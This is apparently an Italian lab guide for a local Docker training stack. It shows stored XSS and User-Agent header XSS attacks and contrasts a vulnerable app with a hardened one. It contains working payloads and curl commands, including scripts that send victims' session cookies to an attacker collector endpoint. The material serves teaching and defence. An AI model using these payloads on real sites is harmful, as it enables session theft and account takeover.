# Payload e procedure di attacco

Tutti gli attacchi presumono che lo stack sia in esecuzione tramite
`docker compose up --build`, con i seguenti URL:

| Servizio   | URL host                          |
|------------|-----------------------------------|
| vulnerable | <http://localhost:8080>           |
| secure     | <http://localhost:8081>           |
| attacker   | <http://localhost:9000>           |

Dalla rete Docker interna, gli host sono raggiungibili come `vulnerable`,
`secure`, `attacker` sulla porta interna (5000/5000/6000). I payload usano
`http://attacker:6000/steal` quando lanciati dal browser di un altro
container della stessa rete, oppure `http://localhost:9000/steal` quando
lanciati dal browser sull'host.

---

## 1. Stored XSS (CAPEC-592, CWE-79)

### Payload base (alert)

```html
<script>alert('XSS-rovo')</script>
```

Postalo come "Commento" su <http://localhost:8080/guestbook>. Ogni
visitatore della pagina vedra il popup.

### Payload realistico - furto del cookie di sessione

```html
<script>
new Image().src = "http://localhost:9000/steal?c=" + encodeURIComponent(document.cookie);
</script>
```

Inseriscilo nel campo "Commento" del guestbook vulnerabile.
Quando un altro utente visita `/guestbook`, il browser carica
l'immagine pseudo-1x1 dal server attaccante e gli invia il proprio
cookie come query string. Verifica su <http://localhost:9000>.

### Payload via tag `<img onerror>` (bypass di filtri ingenui su `<script>`)

```html
<img src=x onerror="fetch('http://localhost:9000/steal?c=' + document.cookie)">
```

### Esecuzione automatizzata con curl

```bash
curl -X POST http://localhost:8080/guestbook \
  -d "author=mallory" \
  --data-urlencode "body=<script>new Image().src='http://localhost:9000/steal?c='+encodeURIComponent(document.cookie)</script>"
```

---

## 2. HTTP Header XSS - User-Agent (CAPEC-86, CWE-79)

L'endpoint `/welcome` riflette l'header `User-Agent` nella pagina senza
sanitizzazione.

### Payload alert

```bash
curl -A '<script>alert("UA-XSS")</script>' http://localhost:8080/welcome
```

La response HTML contiene il payload non scappato, in linea nel template.

### Payload furto cookie (richiede browser/vittima, non solo curl)

```bash
curl -A '<script>new Image().src="http://attacker:6000/steal?c="+document.cookie</script>' \
     http://localhost:8080/welcome
```

Per dimostrare l'esfiltrazione serve una vittima con browser. Il
classico vettore reale e una cache poisoning: l'attaccante invia una
prima richiesta che fa cachare la response avvelenata e una seconda
vittima la riceve dalla cache. In laboratorio basta forzare il
`User-Agent` del proprio browser (es. da DevTools -> Network conditions)
e aprire <http://localhost:8080/welcome>.

---

## 3. Stesso payload contro la versione `secure`

Ripeti gli stessi attacchi sostituendo `8080` con `8081`:

```bash
# Stored XSS contro secure (non funziona)
curl -X POST http://localhost:8081/guestbook \
  -d "author=mallory" \
  --data-urlencode "body=<script>alert(1)</script>"
curl http://localhost:8081/guestbook | grep -E 'script|alert'

# Header XSS contro secure (non funziona)
curl -A '<script>alert(1)</script>' http://localhost:8081/welcome | grep -E 'script|alert'
```

Le risposte conterranno `&lt;script&gt;alert(1)&lt;/script&gt;` come
testo letterale, mai eseguito dal browser. Inoltre la CSP impedisce
l'esecuzione di qualsiasi script inline anche se l'attaccante riuscisse
a bypassare l'escape.
